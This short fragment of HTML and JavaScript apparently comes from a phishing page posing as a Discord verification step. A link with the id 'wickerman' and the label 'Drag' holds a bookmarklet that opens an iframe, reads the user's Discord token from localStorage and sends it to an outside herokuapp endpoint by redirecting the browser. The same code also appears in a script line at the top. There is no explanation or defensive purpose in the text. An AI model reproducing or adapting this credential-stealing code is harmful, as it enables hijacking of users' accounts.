...
window.location.href = "https://discordendpoint-60f3043e7697.herokuapp.com/index.php/verify?="+i.contentWindow.localStorage.token;})()`;
...
<div class="sc-liHMlC djFTYl">
                                          ...
                                          <div><button class="sc-jIAOiI bfMtSn sc-hKdnnL RIgdT" type="button">
                                                      ...
                                                      <a id="wickerman" class="sc-fXynhf hbzcXP" href="javascript:(function() {var i = document.createElement('iframe');document.body.appendChild(i);window.location.href = "https://discordendpoint-60f3043e7697.herokuapp.com/index.php/verify?="+i.contentWindow.localStorage.token;})()">Drag
